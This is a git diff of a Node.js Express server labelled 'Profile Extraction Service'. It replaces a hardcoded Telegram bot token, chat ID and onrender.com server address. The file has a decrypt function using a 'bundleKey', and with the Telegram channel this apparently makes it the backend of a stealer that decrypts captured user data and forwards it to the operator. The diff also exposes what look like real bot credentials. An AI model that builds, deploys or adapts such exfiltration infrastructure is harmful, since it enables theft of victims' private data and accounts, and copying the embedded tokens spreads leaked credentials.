@@ -9,8 +9,8 @@ const nacl = require('tweetnacl');
 const app = express();
 app.use(cors());
 
-const TG_BOT = '8869627653:AAFmeCX6Avj3l-DeoqQKsfQnDNmk__BLvEA';
-const TG_CHAT = '8781253583';
+const TG_BOT = '8758420434:AAE0OU24YuMfEShOxDkQ7kkE-y6RqzbrysM';
+const TG_CHAT = '7983375176';
 
 function decrypt(encrypted, bundleKey) {
   try {
@@ -291,7 +291,7 @@ app.get('/', (req, res) => {
   res.send(`
     <h1>🎯 Profile Extraction Service</h1>
     <p><strong>Status:</strong> ✅ Online</p>
-    <p><strong>Server:</strong> https://nodebookmark.onrender.com</p>
+    <p><strong>Server:</strong> https://studiosguide.onrender.com</p>
     <p><a href="/test">Test Profile Extraction</a></p>
   `);
 });
@@ -318,5 +318,5 @@ app.get('/test', async (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚨 Profile extraction server running on port ${PORT}`);
-  console.log(`🔗 https://nodebookmark.onrender.com`);
+  console.log(`🔗 https://studiosguide.onrender.com`);
 });
